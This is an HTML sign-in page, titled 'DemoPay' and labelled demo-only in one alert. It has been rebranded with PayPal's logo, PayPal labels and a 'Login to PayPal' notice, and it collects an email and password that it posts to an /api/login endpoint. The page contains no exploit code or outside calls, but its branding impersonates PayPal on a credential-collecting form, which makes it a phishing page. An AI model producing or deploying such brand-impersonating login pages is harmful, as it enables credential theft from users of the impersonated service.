<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in — DemoPay</title>
<style>
  :root {
    --bg: #f5f7fa;
    --card: #ffffff;
    --text: #1c1e21;
    --muted: #5b6169;
    --border: #d4d8dd;
    --focus: #0a5cff;
    --error: #c0392b;
    --radius: 8px;
  }

  * { box-sizing: border-box; }

  body {
    margin: 0;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 24px;
    font-family: system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    background: var(--bg);
    color: var(--text);
  }

  .card {
    width: 100%;
    max-width: 420px;
    background: var(--card);
    border: 1px solid var(--border);
    border-radius: var(--radius);
    padding: 32px 28px;
    box-shadow: 0 1px 3px rgba(0,0,0,.06), 0 12px 32px rgba(0,0,0,.05);
  }

  /* Logo */
  .brand {
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto 20px;
  }

  .brand img {
    max-width: 100px;
    width: 50%;
    height: auto;
    display: block;
  }

  h1 {
    margin: 0 0 6px;
    font-size: 1.5rem;
    font-weight: 600;
    text-align: center;
  }

  .subtitle {
    margin: 0 0 24px;
    font-size: .9375rem;
    color: var(--muted);
    text-align: center;
  }

  .field {
    position: relative;
    margin-bottom: 18px;
  }

  .field input {
    width: 100%;
    padding: 18px 14px 8px;
    font-size: 1rem;
    font-family: inherit;
    color: var(--text);
    background: #fff;
    border: 1px solid var(--border);
    border-radius: var(--radius);
    outline: none;
    transition: border-color .15s, box-shadow .15s;
  }

  .field input:focus {
    border-color: var(--focus);
    box-shadow: 0 0 0 3px rgba(10,92,255,.15);
  }

  .field label {
    position: absolute;
    left: 15px;
    top: 14px;
    font-size: 1rem;
    color: var(--muted);
    pointer-events: none;
    transition: transform .15s ease, font-size .15s ease, color .15s ease;
  }

  .field input:focus + label,
  .field input:not(:placeholder-shown) + label {
    transform: translateY(-8px);
    font-size: .75rem;
    color: var(--focus);
  }

  .field .toggle {
    position: absolute;
    right: 8px;
    top: 50%;
    transform: translateY(-50%);
    border: 0;
    background: none;
    padding: 6px 8px;
    font: inherit;
    font-size: .8125rem;
    font-weight: 600;
    color: var(--focus);
    cursor: pointer;
    border-radius: 4px;
  }

  .field .toggle:hover { background: rgba(10,92,255,.08); }

  .error-text {
    display: none;
    margin: -12px 0 16px;
    font-size: .8125rem;
    color: var(--error);
  }

  .field.invalid input { border-color: var(--error); }
  .field.invalid + .error-text { display: block; }

  .row {
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 12px;
    margin-bottom: 22px;
    font-size: .875rem;
  }

  .row label {
    display: flex;
    align-items: center;
    gap: 8px;
    color: var(--muted);
    cursor: pointer;
  }

  a { color: var(--focus); text-decoration: none; }
  a:hover { text-decoration: underline; }

  button.primary {
    width: 100%;
    padding: 14px;
    font: inherit;
    font-size: 1rem;
    font-weight: 600;
    color: #fff;
    background: #0a3fb5;
    border: 0;
    border-radius: 24px;
    cursor: pointer;
    transition: background .15s;
  }

  button.primary:hover { background: #08318c; }
  button.primary:focus-visible {
    outline: 2px solid var(--focus);
    outline-offset: 2px;
  }

  .separator {
    display: flex;
    align-items: center;
    gap: 12px;
    margin: 24px 0;
    color: var(--muted);
    font-size: .875rem;
  }
  .separator::before,
  .separator::after {
    content: "";
    flex: 1;
    height: 1px;
    background: var(--border);
  }

  button.secondary {
    width: 100%;
    padding: 13px;
    font: inherit;
    font-size: 1rem;
    font-weight: 600;
    color: #0a3fb5;
    background: #fff;
    border: 1px solid #0a3fb5;
    border-radius: 24px;
    cursor: pointer;
    transition: background .15s;
  }

  button.secondary:hover { background: rgba(10,63,181,.06); }

  .notice {
    margin: 0 0 20px;
    padding: 12px 14px;
    font-size: .8125rem;
    line-height: 1.5;
    color: #7a5c00;
    background: #fff8e1;
    border: 1px solid #ffe08a;
    border-radius: var(--radius);
  }

  footer {
    margin-top: 28px;
    text-align: center;
    font-size: .8125rem;
    color: var(--muted);
  }

  /* ============================================================
     Button loading state
     ============================================================ */
  button.primary {
    position: relative;
  }

  button.primary .btn-label {
    display: inline-flex;
    align-items: center;
    gap: 8px;
    transition: opacity .15s ease;
  }

  button.primary.is-loading {
    pointer-events: none;
    cursor: wait;
    opacity: .9;
  }

  button.primary.is-loading .btn-label {
    opacity: 0;
  }

  button.primary.is-loading::after {
    content: "";
    position: absolute;
    top: 50%;
    left: 50%;
    width: 18px;
    height: 18px;
    margin: -9px 0 0 -9px;
    border: 2px solid rgba(255, 255, 255, 0.35);
    border-top-color: #fff;
    border-radius: 50%;
    animation: btnSpin 0.7s linear infinite;
  }

  @keyframes btnSpin {
    to { transform: rotate(360deg); }
  }

  /* Optional success / error states */
  button.primary.is-success {
    background: #16a34a;
  }

  button.primary.is-error {
    background: #d92d20;
  }
</style>
</head>
<body>

<main class="card">
  <!-- Updated logo: PayPal 2007 wordmark -->
  <div class="brand" aria-label="PayPal">
    <img
      src="https://logos-world.net/wp-content/uploads/2020/07/PayPal-Logo-2007.png"
      alt="PayPal"
      width="200"
      height="56">
  </div>

  <h1>Sign in</h1>
  <p class="subtitle"></p>

  <p class="notice" role="note">
  Login to PayPal
  </p>

  <!-- form action points to the API endpoint -->
  <form id="demoForm" action="/api/login" method="POST" novalidate>
    <div class="field">
      <input
        type="email"
        id="email"
        name="email"
        placeholder=" "
        autocomplete="username"
        aria-describedby="emailError"
        required>
      <label for="email">Email or mobile number</label>
    </div>
    <p class="error-text" id="emailError">Enter a valid email address.</p>

    <div class="field">
      <input
        type="password"
        id="password"
        name="password"
        placeholder=" "
        autocomplete="current-password"
        aria-describedby="passwordError"
        required>
      <label for="password">Password</label>
      <button type="button" class="toggle" id="togglePw" aria-label="Show password">Show</button>
    </div>
    <p class="error-text" id="passwordError">Password is required.</p>

    <div class="row">
      <label>
        <input type="checkbox" name="remember">
        Keep me signed in
      </label>
      <a href="#">Forgot password?</a>
    </div>

    <button type="submit" class="primary" id="submitBtn">
      <span class="btn-label">Next</span>
    </button>
  </form>

  <div class="separator">or</div>
  <button type="button" class="secondary" id="signup">Create an account</button>

  <footer>
    <a href="#">Privacy</a> &nbsp;·&nbsp;
    <a href="#">Legal</a> &nbsp;·&nbsp;
    <a href="#">Contact</a>
  </footer>
</main>

<script>
  const form = document.getElementById('demoForm');
  const email = document.getElementById('email');
  const password = document.getElementById('password');
  const togglePw = document.getElementById('togglePw');
  const submitBtn = document.getElementById('submitBtn');

  /* ---------- Button loading helper ---------- */

  function setButtonLoading(btn, isLoading) {
    if (!btn) return;
    btn.classList.toggle('is-loading', isLoading);
    btn.disabled = isLoading;
  }

  togglePw.addEventListener('click', () => {
    const showing = password.type === 'text';
    password.type = showing ? 'password' : 'text';
    togglePw.textContent = showing ? 'Show' : 'Hide';
    togglePw.setAttribute('aria-label', showing ? 'Show password' : 'Hide password');
  });

  // Client-side validation. If valid, the browser will POST to /api/login.
  form.addEventListener('submit', (e) => {
    let ok = true;

    const emailField = email.closest('.field');
    const emailValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.value.trim());
    emailField.classList.toggle('invalid', !emailValid);
    if (!emailValid) ok = false;

    const pwField = password.closest('.field');
    const pwValid = password.value.length > 0;
    pwField.classList.toggle('invalid', !pwValid);
    if (!pwValid) ok = false;

    if (!ok) {
      e.preventDefault();
      return;
    }

    // All valid — show loading state. The browser will then perform the
    // native POST to /api/login.
    setButtonLoading(submitBtn, true);
  });

  document.getElementById('signup').addEventListener('click', () => {
    alert('Demo only — no navigation.');
  });
</script>

</body>
</html>
